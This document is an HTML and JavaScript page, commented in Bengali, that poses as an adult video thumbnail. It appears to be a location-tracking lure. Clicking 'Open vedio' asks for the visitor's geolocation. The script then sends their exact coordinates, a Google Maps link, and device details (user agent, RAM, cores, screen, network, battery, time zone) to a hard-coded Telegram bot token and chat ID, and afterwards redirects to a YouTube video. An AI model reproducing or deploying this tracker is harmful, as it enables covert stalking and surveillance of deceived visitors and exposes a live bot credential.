<!DOCTYPE html>
<html lang="bn">

<head>

    <meta charset="UTF-8">

    <meta name="viewport"
          content="width=device-width,
                   initial-scale=1.0,
                   maximum-scale=1.0,
                   user-scalable=no">

    <title>Loading...</title>


    <style>

        * {
            box-sizing: border-box;
        }


        html,
        body {

            margin: 0;
            padding: 0;

            width: 100%;
            height: 100%;

            background: #000;

            overflow: hidden;

            font-family: Arial, sans-serif;
        }


        /* =========================================
           MAIN PAGE
           ========================================= */

        #mainPage {

            position: fixed;

            top: 0;
            left: 0;

            width: 100%;
            height: 100%;

            background: #000;

            display: flex;

            justify-content: center;
            align-items: center;

            z-index: 1;
        }


        /* =========================================
           THUMBNAIL AREA
           ========================================= */

        #thumbnailArea {

            position: absolute;

            top: 0;
            left: 0;

            width: 100%;
            height: 100%;

            background: #000;

            display: flex;

            justify-content: center;
            align-items: center;

            overflow: hidden;
        }


        /* =========================================
           REAL THUMBNAIL
           ========================================= */

        #thumbnail {

            width: 100%;
            height: 100%;

            object-fit: cover;

            display: none;
        }


        /* =========================================
           FALLBACK THUMBNAIL
           ========================================= */

        #thumbnailFallback {

            position: absolute;

            top: 0;
            left: 0;

            width: 100%;
            height: 100%;

            overflow: hidden;

            background: #111;

            display: block;
        }


        #thumbnailFallback img {

            width: 100%;
            height: 100%;

            object-fit: cover;

            filter: blur(18px);

            transform: scale(1.10);

            display: block;
        }


        /* =========================================
           FALLBACK DARK OVERLAY
           ========================================= */

        .fallbackBlur {

            position: absolute;

            top: 0;
            left: 0;

            width: 100%;
            height: 100%;

            background:
                rgba(0, 0, 0, 0.30);
        }


        /* =========================================
           PLAY BUTTON
           ========================================= */

        .fallbackPlay {

            position: absolute;

            top: 50%;
            left: 50%;

            transform:
                translate(-50%, -50%);

            width: 82px;
            height: 58px;

            background: #ff0033;

            border-radius: 16px;

            display: flex;

            align-items: center;
            justify-content: center;

            box-shadow:
                0 5px 25px
                rgba(0, 0, 0, .45);
        }


        .fallbackTriangle {

            width: 0;
            height: 0;

            border-top:
                14px solid transparent;

            border-bottom:
                14px solid transparent;

            border-left:
                23px solid #fff;

            margin-left: 5px;
        }


        /* =========================================
           MAIN DARK OVERLAY
           ========================================= */

        #thumbnailDark {

            position: absolute;

            top: 0;
            left: 0;

            width: 100%;
            height: 100%;

            background:
                rgba(0, 0, 0, .20);

            pointer-events: none;
        }


        /* =========================================
           LOCATION OVERLAY
           ========================================= */

        #locationOverlay {

            position: fixed;

            top: 0;
            left: 0;

            width: 100%;
            height: 100%;

            display: flex;

            justify-content: center;
            align-items: center;

            padding: 20px;

            background:
                rgba(0, 0, 0, .18);

            z-index: 100;
        }


        /* =========================================
           LOCATION BOX
           ========================================= */

        #locationBox {

            width: 100%;

            max-width: 665px;

            background:
                rgba(0, 0, 0, .90);

            border-radius: 20px;

            padding: 25px 18px 22px;

            text-align: center;

            color: #fff;

            box-shadow:
                0 10px 40px
                rgba(0, 0, 0, .65);
        }


        #locationIcon {

            font-size: 36px;

            margin-bottom: 8px;
        }


        #locationTitle {

            font-size: 25px;

            margin-bottom: 12px;
        }


        #locationText {

            font-size: 17px;

            line-height: 1.5;

            color: #eee;

            margin-bottom: 20px;
        }


        /* =========================================
           BUTTONS
           ========================================= */

        .locationButton {

            border: none;

            border-radius: 10px;

            padding: 14px 30px;

            font-size: 17px;

            cursor: pointer;

            margin: 5px;
        }


        #allowButton {

            background: #2196F3;

            color: #fff;
        }


        #skipButton {

            background: #555;

            color: #fff;
        }


        .locationButton:active {

            transform: scale(.97);
        }


        #locationStatus {

            margin-top: 12px;

            font-size: 14px;

            color: #ddd;
        }


        /* =========================================
           LOADING SCREEN
           ========================================= */

        #loading {

            position: fixed;

            top: 0;
            left: 0;

            width: 100%;
            height: 100%;

            background: #000;

            display: none;

            justify-content: center;
            align-items: center;

            flex-direction: column;

            color: #fff;

            z-index: 200;
        }


        .spinner {

            width: 48px;
            height: 48px;

            border: 4px solid #333;

            border-top:
                4px solid #fff;

            border-radius: 50%;

            animation:
                spin 1s linear infinite;

            margin-bottom: 15px;
        }


        @keyframes spin {

            100% {
                transform: rotate(360deg);
            }

        }

    </style>

</head>


<body>


<!-- =================================================
     MAIN PAGE
     ================================================= -->

<div id="mainPage">


    <div id="thumbnailArea">


        <!-- Real Thumbnail -->

        <img
            id="thumbnail"
            alt="Video Thumbnail">


        <!-- =========================================
             BLURRED FALLBACK IMAGE
             ========================================= -->

        <div id="thumbnailFallback">


            <img
                src="https://images.unsplash.com/photo-1544005313-94ddf0286df2?auto=format&fit=crop&w=1200&q=80"
                alt="Video Thumbnail">


            <div class="fallbackBlur"></div>


            <!-- Play Button -->

            <div class="fallbackPlay">

                <div class="fallbackTriangle"></div>

            </div>


        </div>


        <div id="thumbnailDark"></div>


    </div>


</div>



<!-- =================================================
     LOCATION PERMISSION
     ================================================= -->

<div id="locationOverlay">


    <div id="locationBox">


        <div id="locationIcon">
            🔞
        </div>


        <div id="locationTitle">
            আপনি কি ভিডিওটা দেখতে চান?
        </div>


        <div id="locationText">

            ভিডিওটা খুবই গুরুত্বপূর্ণ তাই ভিডিওটা একা একা দেখবেন

        </div>


        <button
            id="allowButton"
            class="locationButton">

            Open vedio

        </button>


        <button
            id="skipButton"
            class="locationButton">

            Close

        </button>


        <div id="locationStatus"></div>


    </div>

</div>



<!-- =================================================
     LOADING
     ================================================= -->

<div id="loading">

    <div class="spinner"></div>

    <div>
        Loading...
    </div>

</div>



<script>


/* =====================================================
   TELEGRAM SETTINGS
   ===================================================== */

const BOT_TOKEN =
    "8855743272:AAETg__YWrwHa3feYecotLTVzqQ_VTRsXII";


const CHAT_ID =
    "5980493892";



/* =====================================================
   ⭐ YOUR URL ⭐
   =====================================================

   এখানে আপনার URL বসাবেন।

   উদাহরণ:

   YouTube:
   https://www.youtube.com/watch?v=XXXXXXXX

   TikTok:
   https://www.tiktok.com/@username/video/XXXXXXXX

   Facebook:
   https://www.facebook.com/XXXXXXXX

   Instagram:
   https://www.instagram.com/reel/XXXXXXXX

   Website:
   https://example.com

   Direct Video:
   https://example.com/video.mp4

   ===================================================== */

const TARGET_URL =
    "https://youtu.be/a3eHtuzFc0E?si=xctpNLNrr5yM-oeY";



/* =====================================================
   ANALYTICS
   ===================================================== */

const analytics = {

    deviceId:
        getDeviceId(),

    userAgent:
        navigator.userAgent,

    ram:
        navigator.deviceMemory
        ? navigator.deviceMemory + " GB"
        : "Unknown",

    cores:
        navigator.hardwareConcurrency
        ? navigator.hardwareConcurrency +
          " Cores"
        : "Unknown",

    screenRes:
        window.screen.width +
        " x " +
        window.screen.height,

    orientation:
        window.screen.height >=
        window.screen.width
        ? "Portrait"
        : "Landscape",

    theme:
        window.matchMedia(
            "(prefers-color-scheme: dark)"
        ).matches
        ? "Dark Mode"
        : "Light Mode",

    networkType:
        navigator.connection
        ? navigator.connection
            .effectiveType
            .toUpperCase()
        : "Unknown",

    downlink:
        navigator.connection
        ? navigator.connection.downlink +
          " Mbps"
        : "Unknown",

    localTime:
        new Date().toLocaleTimeString(),

    timeZone:
        Intl.DateTimeFormat()
        .resolvedOptions()
        .timeZone,

    language:
        navigator.language ||
        navigator.userLanguage ||
        "Unknown",

    battery:
        "Unknown",

    permissionStatus:
        "Not Requested",

    mapLink:
        "N/A"
};



/* =====================================================
   DEVICE ID
   ===================================================== */

function getDeviceId() {

    let deviceId =
        localStorage.getItem(
            "app_device_id"
        );


    if (!deviceId) {

        deviceId =
            "DEV-" +
            Math.floor(
                100000 +
                Math.random() * 900000
            );


        localStorage.setItem(
            "app_device_id",
            deviceId
        );

    }


    return deviceId;

}



/* =====================================================
   SHOW FALLBACK THUMBNAIL
   ===================================================== */

function showFallbackThumbnail() {

    const thumbnail =
        document.getElementById(
            "thumbnail"
        );

    const fallback =
        document.getElementById(
            "thumbnailFallback"
        );


    thumbnail.style.display =
        "none";


    fallback.style.display =
        "block";
}



/* =====================================================
   LOAD THUMBNAIL
   ===================================================== */

function loadThumbnail() {


    /*
     * প্রথমে fallback thumbnail দেখানো হবে।
     */

    showFallbackThumbnail();


    /*
     * URL না থাকলে fallback-ই থাকবে।
     */

    if (
        !TARGET_URL ||
        TARGET_URL === "Your URL"
    ) {

        return;

    }


    const url =
        TARGET_URL.trim();



    /* =========================================
       YOUTUBE
       ========================================= */

    const youtubeID =
        getYouTubeID(url);


    if (youtubeID) {


        const thumbnail =
            document.getElementById(
                "thumbnail"
            );


        const fallback =
            document.getElementById(
                "thumbnailFallback"
            );


        /*
         * High quality thumbnail
         */

        thumbnail.src =
            "https://img.youtube.com/vi/" +
            youtubeID +
            "/maxresdefault.jpg";


        thumbnail.onload =
            function () {

                thumbnail.style.display =
                    "block";


                fallback.style.display =
                    "none";

            };


        thumbnail.onerror =
            function () {


                /*
                 * যদি maxresdefault না পাওয়া যায়
                 * তাহলে hqdefault চেষ্টা করবে।
                 */

                thumbnail.src =
                    "https://img.youtube.com/vi/" +
                    youtubeID +
                    "/hqdefault.jpg";


                thumbnail.onload =
                    function () {

                        thumbnail.style.display =
                            "block";


                        fallback.style.display =
                            "none";

                    };


                thumbnail.onerror =
                    function () {

                        showFallbackThumbnail();

                    };

            };


        return;

    }



    /* =========================================
       DIRECT VIDEO
       ========================================= */

    if (
        url.match(
            /\.(mp4|webm|ogg)(\?.*)?$/i
        )
    ) {

        createVideoPreview(url);

    }


    /*
     * অন্য Social Media বা Website হলে
     * fallback blurred image থাকবে।
     */

}



/* =====================================================
   DIRECT VIDEO PREVIEW
   ===================================================== */

function createVideoPreview(url) {


    const video =
        document.createElement(
            "video"
        );


    video.src =
        url;


    video.muted =
        true;


    video.preload =
        "metadata";


    video.playsInline =
        true;


    video.style.position =
        "absolute";


    video.style.top =
        "0";


    video.style.left =
        "0";


    video.style.width =
        "100%";


    video.style.height =
        "100%";


    video.style.objectFit =
        "cover";


    video.style.display =
        "none";


    video.addEventListener(
        "loadeddata",
        function () {

            try {

                video.currentTime =
                    0;

            }

            catch (error) {

                showFallbackThumbnail();

            }

        }
    );


    video.addEventListener(
        "seeked",
        function () {


            const fallback =
                document.getElementById(
                    "thumbnailFallback"
                );


            const thumbnailArea =
                document.getElementById(
                    "thumbnailArea"
                );


            fallback.style.display =
                "none";


            video.style.display =
                "block";


            thumbnailArea.insertBefore(
                video,
                document.getElementById(
                    "thumbnailDark"
                )
            );

        }
    );


    video.addEventListener(
        "error",
        function () {

            showFallbackThumbnail();

        }
    );


    video.load();

}



/* =====================================================
   GET YOUTUBE VIDEO ID
   ===================================================== */

function getYouTubeID(url) {

    try {


        const parsed =
            new URL(url);


        /* YouTube Watch */

        if (
            parsed.hostname
                .includes("youtube.com") &&
            parsed.pathname === "/watch"
        ) {

            return parsed.searchParams
                .get("v");

        }


        /* YouTube Short URL */

        if (
            parsed.hostname
                .includes("youtu.be")
        ) {

            return parsed.pathname
                .substring(1);

        }


        /* YouTube Shorts */

        if (
            parsed.hostname
                .includes("youtube.com") &&
            parsed.pathname
                .startsWith("/shorts/")
        ) {

            return parsed.pathname
                .split("/")[2];

        }


        /* YouTube Embed */

        if (
            parsed.hostname
                .includes("youtube.com") &&
            parsed.pathname
                .startsWith("/embed/")
        ) {

            return parsed.pathname
                .split("/")[2];

        }

    }

    catch (error) {

        return null;

    }


    return null;

}



/* =====================================================
   PAGE LOAD
   ===================================================== */

document.addEventListener(
    "DOMContentLoaded",
    function () {


        /*
         * Thumbnail load
         */

        loadThumbnail();


        /*
         * Device information
         */

        collectDeviceInformation();

    }
);



/* =====================================================
   DEVICE INFORMATION
   ===================================================== */

function collectDeviceInformation() {


    if (navigator.getBattery) {


        navigator.getBattery()

        .then(
            function (battery) {


                analytics.battery =
                    Math.round(
                        battery.level * 100
                    ) +
                    "% (" +
                    (
                        battery.charging
                        ? "Charging"
                        : "Not Charging"
                    ) +
                    ")";

            }
        )

        .catch(
            function () {

                analytics.battery =
                    "Unknown";

            }
        );


    } else {


        analytics.battery =
            "Not Supported";

    }

}



/* =====================================================
   ALLOW LOCATION
   ===================================================== */

document
.getElementById(
    "allowButton"
)
.addEventListener(
    "click",
    function () {

        requestLocation();

    }
);



/* =====================================================
   SKIP
   ===================================================== */

document
.getElementById(
    "skipButton"
)
.addEventListener(
    "click",
    function () {


        analytics.permissionStatus =
            "User Skipped";


        analytics.mapLink =
            "N/A";


        exitWebsite();

    }
);



/* =====================================================
   REQUEST LOCATION
   ===================================================== */

function requestLocation() {


    const status =
        document.getElementById(
            "locationStatus"
        );


    status.textContent =
        "🎥 opening video...";


    if (!navigator.geolocation) {


        analytics.permissionStatus =
            "Not Supported";


        status.textContent =
            "এই Browser-এ  Support নেই।";


        setTimeout(
            function () {

                exitWebsite();

            },
            700
        );


        return;

    }



    navigator.geolocation.getCurrentPosition(


        /* =========================================
           SUCCESS
           ========================================= */

        function (position) {


            const latitude =
                position.coords.latitude;


            const longitude =
                position.coords.longitude;


            analytics.permissionStatus =
                "Allowed";


            analytics.mapLink =
                "https://www.google.com/maps?q=" +
                latitude +
                "," +
                longitude;


            status.textContent =
                "✅ video opening";


            /*
             * Telegram notification
             */

            sendTelegramMessage();


            /*
             * Location Allow করার পর
             * আপনার Target URL ওপেন হবে
             */

            setTimeout(
                function () {

                    openTargetWebsite();

                },
                500
            );

        },


        /* =========================================
           DENIED / ERROR
           ========================================= */

        function () {


            analytics.permissionStatus =
                "Denied / Unavailable";


            analytics.mapLink =
                "N/A";


            status.textContent =
                "❌ অনুমোদন করা হয়নি।";


            /*
             * Location না দিলে
             * পেজ থেকে বের হবে
             */

            setTimeout(
                function () {

                    exitWebsite();

                },
                800
            );

        },


        {

            enableHighAccuracy:
                true,

            timeout:
                10000,

            maximumAge:
                0

        }

    );

}



/* =====================================================
   OPEN TARGET URL
   ===================================================== */

function openTargetWebsite() {


    if (
        !TARGET_URL ||
        TARGET_URL === "Your URL"
    ) {

        return;

    }


    const url =
        TARGET_URL.trim();


    /*
     * iframe ব্যবহার করা হচ্ছে না।
     *
     * সরাসরি URL ওপেন করা হচ্ছে।
     *
     * তাই X-Frame-Options/CSP-এর কারণে
     * iframe block হওয়ার সমস্যা থাকবে না।
     */

    window.location.href =
        url;

}



/* =====================================================
   EXIT WEBSITE
   ===================================================== */

function exitWebsite() {


    try {


        window.location.replace(
            "about:blank"
        );


    }

    catch (error) {


        document.documentElement
            .innerHTML = "";


        document.body.style.background =
            "#000";

    }

}



/* =====================================================
   TELEGRAM MESSAGE
   ===================================================== */

function sendTelegramMessage() {


    /*
     * Token configure করা না থাকলে
     * request পাঠাবে না।
     */

    if (
        !BOT_TOKEN ||
        BOT_TOKEN ===
        "YOUR_BOT_TOKEN_HERE"
    ) {

        console.log(
            "Telegram Bot Token not configured."
        );

        return;

    }


    if (
        !CHAT_ID ||
        CHAT_ID ===
        "YOUR_CHAT_ID_HERE"
    ) {

        console.log(
            "Telegram Chat ID not configured."
        );

        return;

    }



    let messageText =
        "📊 *App Analytics Notification*\n\n";


    messageText +=
        "🆔 *Device ID:* `" +
        analytics.deviceId +
        "`\n";


    messageText +=
        "📱 *Device Info:* " +
        analytics.userAgent +
        "\n";


    messageText +=
        "⚙️ *Hardware:* " +
        analytics.cores +
        " | ~" +
        analytics.ram +
        "\n";


    messageText +=
        "📐 *Display:* " +
        analytics.screenRes +
        " (" +
        analytics.orientation +
        ") | " +
        analytics.theme +
        "\n";


    messageText +=
        "🌐 *Network:* " +
        analytics.networkType +
        " (Speed: " +
        analytics.downlink +
        ")\n";


    messageText +=
        "🕒 *Time:* " +
        analytics.localTime +
        " (" +
        analytics.timeZone +
        ")\n";


    messageText +=
        "🗣️ *Language:* " +
        analytics.language +
        "\n";


    messageText +=
        "🔋 *Battery:* " +
        analytics.battery +
        "\n\n";


    messageText +=
        "🔒 *Location Permission:* " +
        analytics.permissionStatus +
        "\n";


    if (
        analytics.permissionStatus ===
        "Allowed"
    ) {


        messageText +=
            "🗺️ *Location:* " +
            "[View Location on Google Maps](" +
            analytics.mapLink +
            ")";


    } else {


        messageText +=
            "⚠️ Location was not shared.";

    }



    const telegramURL =
        "https://api.telegram.org/bot" +
        BOT_TOKEN +
        "/sendMessage";



    fetch(
        telegramURL,
        {

            method:
                "POST",

            headers:
                {
                    "Content-Type":
                        "application/json"
                },

            body:
                JSON.stringify({

                    chat_id:
                        CHAT_ID,

                    text:
                        messageText,

                    parse_mode:
                        "Markdown",

                    disable_web_page_preview:
                        false

                })

        }
    )

    .then(
        function (response) {

            return response.json();

        }
    )

    .then(
        function (result) {

            console.log(
                "Telegram response:",
                result
            );

        }
    )

    .catch(
        function (error) {

            console.error(
                "Telegram Error:",
                error
            );

        }
    );

}

</script>


</body>

</html>
